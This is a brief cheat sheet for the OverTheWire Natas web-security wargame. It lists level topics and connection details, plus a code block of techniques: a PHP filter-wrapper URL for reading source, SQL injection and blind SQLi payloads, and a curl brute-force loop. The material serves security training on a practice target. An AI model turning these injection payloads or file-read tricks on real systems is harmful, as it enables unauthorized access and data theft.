# Natas

**Difficulty:** Beginner–Intermediate | **Topics:** Web security — PHP source review, SQLi, XSS, LFI, SSRF, crypto, session manipulation

Web-focused wargame. Each level is a PHP web application with a hidden password for the next level.

## Connection

```bash
# Browser only — no SSH
# http://natas<N>.natas.labs.overthewire.org
# Username: natasN  Password: <from previous level>
# Level 0 password: natas0
```

## Concepts by Level

| Levels | Topics |
|--------|--------|
| 0–5 | View source, cookies, `curl` headers, base64 |
| 6–10 | PHP source inclusion, `grep` injection, file read |
| 11–15 | XOR encryption, SQL injection (blind, time-based) |
| 16–20 | Command injection, session hijacking, brute force |
| 21–25 | Object injection, SSRF, PHP type juggling |
| 26–34 | Deserialization, advanced crypto, LFI/RFI |

## Key Techniques

```bash
# Read PHP source via include wrapper
curl "http://natasN.natas.labs.overthewire.org/?page=php://filter/convert.base64-encode/resource=index"

# Basic SQLi test
' OR 1=1-- -

# Blind SQLi
' AND SUBSTRING(password,1,1)='a'-- -

# Brute force with curl
for i in $(seq 0 9); do curl -u natasN:pass "http://.../?passwd=$i"; done
```
